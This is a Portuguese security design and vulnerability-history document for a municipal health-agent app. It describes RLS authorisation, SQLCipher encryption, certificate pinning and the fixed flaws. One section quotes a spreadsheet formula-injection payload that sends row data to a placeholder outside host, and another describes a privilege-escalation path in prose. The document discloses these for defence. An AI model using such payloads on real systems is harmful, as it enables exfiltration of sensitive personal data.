# Segurança

O sistema guarda nome, CPF, cartão do SUS, endereço, condição de saúde,
medicação, dado de gestante, de criança, e relato de violência doméstica e de
negligência. É **dado pessoal sensível** na definição do art. 5º, II da LGPD, e
o destino é uso por secretaria municipal de saúde.

Este documento descreve o modelo, e registra os defeitos encontrados e
corrigidos, porque saber onde o sistema já falhou é mais útil que uma lista de
boas práticas.

---

## O modelo, em uma frase

Quem decide o que cada pessoa pode ler e gravar é o **banco**, por Row Level
Security. O aplicativo e o painel não são a fronteira de segurança: os dois
falam com o servidor usando a chave `anon`, que é pública por desenho e vai
dentro do pacote publicado.

Isso tem uma consequência que orienta tudo o mais: **qualquer regra de acesso
que o cliente poderia contornar não é regra de acesso.** Validação na tela
serve para a pessoa não errar, não para impedir quem quer invadir.

---

## As camadas

### 1. Identidade

| Onde | Como |
|---|---|
| Aplicativo, uso offline | autenticação local no SQLite, senha com PBKDF2-HMAC-SHA256 (100 mil iterações) calculado em código nativo do Android, bloqueio de 15 minutos depois de 5 erros |
| Aplicativo, sincronização | sessão do Supabase Auth, aberta no login quando há rede |
| Painel web | sessão do Supabase Auth, por cookie, renovada pelo middleware |

O aplicativo autentica duas vezes de propósito. A autenticação local é o que
permite trabalhar sem rede, que é a razão de o sistema existir. A sessão do
Supabase é o que permite gravar no servidor, porque as policies decidem por
`auth.uid()`.

Sem sessão, a sincronização **para antes de tentar** e avisa. Isso não é
elegância: a fila conta tentativas e marca o item como erro definitivo depois
de cinco. Rodando sem sessão, cinco ciclos transformariam a coleta de um dia
inteiro em erro permanente, por uma causa sem relação com o dado.

### 2. Autorização

Quatro papéis, iguais em todo o sistema e no CHECK de `agentes.role`:

| Papel | Alcance |
|---|---|
| `agente` | os próprios pacientes |
| `coordenador` | a própria unidade de saúde |
| `gerente` | tudo, mais a trilha de auditoria |
| `admin` | tudo, mais a gestão de usuários |

As policies usam funções auxiliares (`agente_papel()`, `agente_unidade()`,
`pode_ler_prontuario()`) declaradas `SECURITY DEFINER` com `search_path`
travado. Isso existe para quebrar a recursão de uma policy que precisa
consultar outra tabela protegida por RLS.

Os guardas de tela espelham as policies **de propósito**, e há um teste que
confere isso (`contratoPapeis.test.ts`). Guarda que não casa com a policy
produz o pior tipo de erro: a página abre e vem vazia, e quem usa conclui que
não há dado em vez de que não tem permissão.

### 3. Dado em repouso

- Senha: PBKDF2-HMAC-SHA256 com sal de 16 bytes e 100 mil iterações, comparação em tempo constante. No Android o cálculo é nativo (`modules/pbkdf2-nativo`): em JavaScript puro, no Hermes, levava segundos por login. A saída é idêntica à da `@noble/hashes`, conferida com os vetores da RFC 7914.
- Banco local: **cifrado inteiro com SQLCipher**. A chave é de 256 bits,
  sorteada na primeira execução e guardada no Keystore do aparelho
  (`database/chave.ts`); é aplicada com `PRAGMA key` como a primeira operação da
  abertura (`database/database.ts`), antes de qualquer leitura. Ligado pelo
  `useSQLCipher` do `expo-sqlite` no `app.json`.

  Cifrar o banco inteiro, e não campo a campo, foi decisão: preserva a busca
  local que o agente usa em campo e é AEAD de verdade. A cifra de campo que
  existia antes (`encryptField`, SHA-256 em modo contador feito à mão, sem MAC)
  foi removida, não ligada: fluxo sem autenticação é maleável, e cifrar `nome` e
  `cpf` quebraria a busca. Antes do SQLCipher o que protegia o arquivo era só a
  cifra de disco do Android, que vale enquanto o aparelho está bloqueado.

  Como o formato do arquivo muda, atualizar de uma versão sem cifra exige nova
  instalação; num sistema offline-first o dado volta do servidor na
  sincronização. Por isso a versão subiu para 1.2.0 (`versionCode` 3).
- Chave de cifra e token de sessão: SecureStore (Keychain no iOS, Keystore no
  Android).
- `senha_hash` é ilegível pelo cliente: o `GRANT` de `agentes` é coluna por
  coluna, e essa coluna fica de fora.
- Exclusão é lógica (`deleted_at`), não física.

Vale saber **por que o GRANT é coluna por coluna**: `REVOKE SELECT (coluna)`
não tem efeito quando existe `GRANT` na tabela inteira. O jeito que funciona é
revogar a tabela e conceder as colunas permitidas uma a uma.

### 4. Trilha

`audit_log` é append-only no servidor: tem policy de INSERT e de SELECT, e
`REVOKE UPDATE, DELETE` por cima, para nem o papel `authenticated` tentar
alterar linha de auditoria. A leitura é restrita a gerente e admin.

O registro de evento ainda é raro na prática. Ver [lgpd.md](lgpd.md).

### 5. Dado em trânsito

Toda a sincronização é por HTTPS. Além da loja de confiança do sistema, o
aplicativo **fixa o certificado** do Supabase pela configuração de segurança de
rede do Android (`plugins/fixar-certificado.js`): a conexão só é aceita se a
cadeia TLS passar por uma de duas chaves públicas, a intermediária do Google
Trust Services (WE1) que assina o host e a raiz GTS Root R4 como reserva.

Fixar a intermediária e a raiz, e não o certificado da folha, foi decisão: a
folha do Supabase rotaciona sozinha, as duas âncoras não, e dois pinos evitam
que a rotação de um derrube a sincronização em campo. O `pin-set` tem
`expiration`: se o Google trocar a própria cadeia, depois da data o Android
deixa de exigir o pino em vez de travar o agente sem conserto remoto. Renovar é
recalcular os pinos com `openssl` e publicar uma versão nova antes da data; o
procedimento está no cabeçalho do plugin.

---

## Defeitos encontrados e corrigidos

Cada um foi reproduzido num PostgreSQL com o schema, as migrações e as policies
reais, antes e depois da correção. A mensagem de erro citada é a que o banco
devolveu.

### Sete tabelas sem Row Level Security

`agentes`, `audit_log` e as cinco `prontuario_*` não tinham RLS. Com a chave
`anon`, que é pública, qualquer pessoa lia e gravava prontuário de saúde, CPF e
hash de senha.

Medido antes da correção: visitante sem login leu 2 prontuários de saúde e 4
agentes com CPF; um agente leu o paciente de outro; um coordenador leu outra
unidade.

Corrigido com RLS e policy em todas as tabelas, mais os `GRANT` coluna por
coluna em `agentes`. Suíte: `rodar-testes-rls.sh`, 22 verificações.

### Elevação de privilégio na aprovação de cadastro

As Server Actions `aprovarSolicitacao` e `rejeitarSolicitacao` recebiam o id do
aprovador **como parâmetro**, confiavam nele, e usavam o cliente de serviço,
que ignora o RLS. Não havia verificação de sessão nem de papel.

O caminho era direto e sem credencial: preencher o cadastro público escolhendo
cargo "gerente", chamar `aprovarSolicitacao` com o id da própria solicitação e
qualquer uuid como aprovador, e receber uma conta de gerente. O limite de taxa
não atrapalhava, porque contava por um valor que o atacante escolhia.

Corrigido: a identidade vem do cookie de sessão, o parâmetro foi removido da
assinatura, e o papel é conferido com a mesma regra da policy de auditoria.
Doze testes, conferidos contra o código vulnerável.

### Senha de administrador publicada

A senha do administrador criado na primeira execução era a constante
`Admin@2025`, escrita no repositório, numa tabela do README e impressa na tela
de configurações do aplicativo. O repositório é público.

A primeira correção (1.2) sorteava a senha e a guardava no SecureStore. Ela
abriu dois problemas, descritos a seguir.

### Senha do administrador na tela de entrada (1.2.x)

Para a área administrativa ser alcançável numa instalação nova, a 1.2 passou
a mostrar CPF e senha do administrador na tela de entrada, para qualquer
pessoa que abrisse o aplicativo. O texto dizia que o aviso sumia quando a
senha fosse trocada, mas nada apagava o aviso na troca: só o botão "Já anotei,
remover", dentro da área administrativa. Em teste, uma pessoa sem conta entrou
como administradora lendo a senha da tela.

Corrigido em 10/11/2026: o administrador nasce **sem senha** e a tela de
entrada oferece "Configurar administrador", em que quem instala escolhe a
senha. Nenhuma senha é sorteada, guardada ou exibida. O botão depende do estado
da conta, então some sozinho. Instalação que vem da 1.2.x com a senha sorteada
ainda guardada tem essa senha tratada como vazada: a atualização a apaga e
pede configuração nova.

O que continua: num aparelho novo, quem abre primeiro configura o
administrador. É inerente a uma conta que existe só no aparelho, sem servidor
para dizer quem é quem.

### Recuperação de senha sem segredo

"Esqueci minha senha" pedia CPF e e-mail e, se batessem, deixava escolher a
senha nova. Nenhum dos dois é segredo. Os do administrador eram públicos: o
CPF na tela de entrada e o e-mail (`admin@conectagente.local`) no código.
Qualquer pessoa com o aparelho na mão virava administradora, mesmo depois de
o aviso da senha sumir. Com agente comum, bastava saber CPF e e-mail de um
colega de unidade.

Corrigido em 10/11/2026: cada conta recebe um **código de recuperação**
(`XXXX-XXXX-XXXX`, 60 bits, alfabeto de 32 símbolos sem viés), mostrado uma
única vez. Só o hash fica no SecureStore. A recuperação pede CPF e código,
responde com mensagem genérica, bloqueia por 15 minutos depois de 5 erros, e
troca o código a cada uso. Quem perdeu o código pede ao administrador, que gera
um novo na tela de agentes sem ver nem definir a senha do agente.

A troca pela recuperação vale para entrar no aparelho. A senha da conta no
Supabase Auth, usada pela sincronização, muda junto quando o aparelho ainda tem
uma sessão aberta da mesma pessoa (`updateUser`). Sem sessão não há como provar
ao servidor quem é quem: a conta usa e-mail interno, sem "esqueci a senha" do
lado de lá. Nesse caso o aparelho marca a pendência, o login avisa que a
sincronização está parada, e a coordenação redefine a senha de sincronização no
painel (`redefinirSenhaDeAcesso`). Só para baixo na hierarquia: gerente redefine
agente e coordenador; admin redefine também gerente; ninguém redefine a si
mesmo nem um par. A ação fica na trilha de auditoria, sem a senha.

O administrador que perde a senha e o código não tem acima dele quem gere um
código novo. A tela de entrada oferece reiniciar o aparelho sem reinstalar:
mostra quantos registros ainda não foram para o servidor, pede que cada agente
sincronize antes, e exige digitar `APAGAR`. Apaga tudo junto, e não só a conta
do administrador: voltar só ela para "sem senha" deixaria qualquer pessoa com o
aparelho entrar como administradora.

### Hash de senha rápido demais

A senha era guardada como `sha256(sal + senha)`, uma passada só. O sal impede
tabela pronta, mas um computador comum faz bilhões de SHA-256 por segundo: com
o banco em mãos, uma senha de 8 caracteres caía em minutos.

Corrigido em 10/11/2026: PBKDF2-HMAC-SHA256 com 100 mil iterações e sal de 16
bytes, pela `@noble/hashes` (auditada, sem dependências). O número foi medido:
150 ms no Node desta máquina, perto de um segundo no celular, que roda
JavaScript no Hermes sem compilação. O OWASP pede 600 mil para servidor; no
aparelho seriam vários segundos por login. O banco já é cifrado com SQLCipher,
então o hash é a segunda camada. As iterações vão dentro do hash, e quem entra
com hash antigo (SHA-256 com ou sem sal, ou menos iterações) é regravado no
login.

### Limite de tentativas que zerava ao reabrir

A contagem de tentativas erradas ficava só na memória. Fechar e abrir o
aplicativo dava mais cinco tentativas, sem espera. Corrigido em 10/11/2026: a
contagem vai para o armazenamento do aplicativo e sobrevive ao reinício. Vale
para o login e para a recuperação de senha.

### Injeção de fórmula em planilha

A exportação de relatório escapava vírgula, aspas e quebra de linha, mas não o
`=` inicial. Excel e LibreOffice executam célula que começa com `=`, `+`, `-`,
`@`, tabulação ou retorno de carro, e as observações da visita são texto livre
digitado em campo.

Uma célula com `=HYPERLINK("http://fora.example/"&A1,"clique")` exfiltraria a
linha quando alguém da secretaria abrisse o arquivo. Corrigido no aplicativo e
no painel. No CSV, com prefixo de apóstrofo. No .xlsx, desde 10/11/2026, cada
célula é gravada com o tipo texto declarado, que o Excel não interpreta como
fórmula; o apóstrofo aplicado ali aparecia escrito na célula, e todo campo
vazio saía como `'-`.

### Vulnerabilidade crítica no framework

O Next.js 15.5.20 tinha dois RCE críticos sem autenticação, um específico de
servidor Windows. Atualizado para 15.5.27, que fecha os doze avisos da linha.
O `axios` do aplicativo acumulava doze avisos, entre eles SSRF por
redirecionamento; atualizado para 1.20.0.

O CI passou a ter portão: `npm audit --omit=dev` tem que ficar em zero no
painel, e nenhuma crítica no aplicativo.

---

### A leitura auditada era contornável

`fn_ler_morador` grava quem abriu a ficha, mas a tabela `moradores` tinha
`SELECT` inteiro para `authenticated`. Qualquer usuário logado pedia `cpf`,
`cartao_sus` ou `doencas` direto ao PostgREST e lia sem deixar rastro, e a tela
da família do próprio painel fazia isso com `moradores(*)`.

Corrigido em 28/10/2026 com `GRANT` coluna por coluna, como em
`agentes.senha_hash`. As listas leem nome, idade e marcadores; o resto só sai
pela função auditada. A busca por documento virou
`fn_buscar_morador_por_documento`: comparação exata, para não servir de oráculo
de prefixo, registrada sem guardar o documento.

O teste de banco achou um efeito colateral antes de ir para produção: o
Postgres exige ler as colunas que um `INSERT ... ON CONFLICT DO UPDATE`
atualiza, e o aplicativo sincronizava morador com upsert. A mensagem foi
`permission denied for table moradores`. O aplicativo passou a gravar com
INSERT e, na retentativa, UPDATE pelo id. Suíte: `rodar-testes-colunas.sh`.

### Conta desativada continuava com acesso

`agentes.ativo` não era consultado por nenhuma policy. Desativar um agente o
tirava das listas, e a sessão aberta continuava lendo prontuário. Corrigido
com uma policy `RESTRICTIVE` por tabela de dado, que o Postgres soma com E às
policies que já existiam, sem reescrevê-las.

### Funções de painel falhavam abertas

As seis funções de indicadores são `SECURITY DEFINER` e escolhiam o alcance
pelo papel de quem chama. Papel nulo, de quem não tem login ou não tem
cadastro, não casava com nenhum `IF` e caía no ramo de gerente: quatro delas
devolviam os números da cidade inteira e o nome dos agentes para quem tivesse
só a chave pública. Também estavam sem `search_path` travado. Agora recusam sem
cadastro ativo, travam o `search_path` e não são executáveis por `anon`.
Suíte: `07-conta-ativa.sql`, dentro de `rodar-testes-colunas.sh`.

### Painel publicado sem banco e sem as correções

Em 29/10/2026 o painel em produção ainda servia a versão de maio. O projeto da
Vercel tinha sido publicado à mão e não estava ligado ao repositório, então
nenhum merge chegava ao ar, e as variáveis de ambiente eram os valores de
exemplo: `/api/health` respondia `misconfigured`. Nenhuma correção deste
documento valia para quem abria o site, e o DAST estava avaliando o código
antigo.

Corrigido: o projeto foi ligado ao repositório com a branch `produção` e a
pasta `ConectAgente-web`, e as variáveis receberam os valores reais, com a
chave de serviço como segredo. `/api/health` passou a responder `healthy`.

### Estilo injetado liberado pela política de conteúdo

O `style-src` tinha `'unsafe-inline'` porque o `globals.css` importava a fonte
do Google, além do `next/font`. Com isso, um `<style>` injetado passava, e
seletor de atributo em CSS vaza valor de campo da tela, um caractere por
requisição. O import também mandava o IP de cada visitante ao Google.

Corrigido em 29/10/2026: a fonte vem só do `next/font`, servida pelo próprio
site; `style-src` aceita só o nonce da requisição; atributo `style=""` continua
liberado em `style-src-attr`, porque os componentes e os gráficos renderizam
estilo assim. Conferido no Chromium, sem violação em `/login`, `/registro` e
`/demo`. Entraram também `Cross-Origin-Embedder-Policy: credentialless`,
`Cross-Origin-Opener-Policy` e `Cross-Origin-Resource-Policy`.

### O visitante tinha privilégio de tabela

Apontado pelo consultor de segurança do Supabase em 09/11/2026. O papel `anon`,
o de quem usa a chave pública sem login, tinha `SELECT` nas colunas de
`agentes` (CPF, e-mail, telefone), `INSERT`, `UPDATE`, `DELETE` e `TRUNCATE`
nas tabelas de dado, e executava as funções auxiliares das policies pela rota
`/rest/v1/rpc`. O RLS filtrava as linhas, mas `TRUNCATE` nem passa por ele, e
a defesa dependia de a API não emitir esse comando.

Nada do sistema usa `anon` para dado: o login é pelo Supabase Auth e toda
leitura acontece depois dele. `migration_sem_anonimo.sql` tira de `anon` todo
privilégio de tabela, sequência e função auxiliar, inclusive nos objetos
criados depois, tira `TRUNCATE` de `authenticated`, fixa o `search_path` das
duas funções de gatilho e remove a policy `solicitacoes_insert_anon`
(`WITH CHECK (true)`), que deixava gravar pedido de cadastro direto pela API,
por fora da validação e do limite de tentativas da tela. Suíte:
`08-sem-anonimo.sql`; a de RLS passou a exigir recusa, e não zero linhas.

Efeito colateral encontrado na aplicação em produção: o `/api/health`
consultava `agentes` sem login com `HEAD`, que volta sem corpo, e a recusa por
permissão chegava igual a uma chave inválida, como 401. O health passou a
responder `degraded` com o banco de pé. Corrigido com `GET`, que traz o código
`42501` no corpo.

### Fichas de prontuário legíveis pela API

Pressão, glicemia, pré-natal, vacina da criança, preventivo e relato de
violência eram legíveis direto pelo PostgREST por qualquer usuário logado,
dentro do RLS e sem registro na trilha. Ninguém precisa dessa leitura: o painel
não abre ficha de prontuário, e o aplicativo guarda a ficha no aparelho e só
envia. `migration_prontuario_fechado.sql` deixa só as chaves legíveis.

O aplicativo gravava as fichas com upsert, que o Postgres recusa quando o
usuário não pode ler as colunas atualizadas (o mesmo efeito visto em
`moradores`). A 1.2.2 grava com `INSERT` e, na retentativa, `UPDATE` pela
`prontuario_id`. Suíte: `09-prontuario-fechado.sql`, inclusive que o upsert
antigo é recusado em vez de aceito em silêncio.

## O que continua em aberto

A lista completa, por ameaça e com a prova de cada controle, está em
[modelo-de-ameacas.md](modelo-de-ameacas.md); o mapa do OWASP MASVS em
[masvs.md](masvs.md); e a auditoria LGPD com o relatório de impacto em
[auditoria-lgpd.md](auditoria-lgpd.md).

- **As fichas só fecham com a 1.2.2 instalada.** A migração recusa o upsert das
  versões anteriores, então entra no banco junto com a distribuição da 1.2.2.
- **Dependências de build com aviso aberto:** `deepmerge` (do Jest), `uuid` 7 e
  `image-size` 1 (do Metro e do config-plugins), e `glob` e `minimatch` (ReDoS
  que só dispara com padrão vindo de atacante; aqui o padrão é configuração fixa
  das ferramentas, e a correção exige majors que elas não aceitam). São
  ferramenta de build, não entram no pacote entregue. `image-size` 2.x e `uuid` 11.x corrigiriam os
  avisos, mas quebram o empacotamento do Metro, e isso foi medido: `TypeError:
  The "list" argument must be an instance of SharedArrayBuffer`. O `node-forge`
  saiu desta lista em 02/11/2026, com a 1.4.1, e `braces` e `sprintf-js` já não
  aparecem no OSV.
- **O limite de taxa é em memória do processo.** Serve para o caso de um
  servidor; com mais de uma instância, cada uma conta separado.
- **Não há segundo fator** para o painel, que é onde se lê o prontuário de
  todos.

---

## Como reportar uma falha

Ver [SECURITY.md](../SECURITY.md).
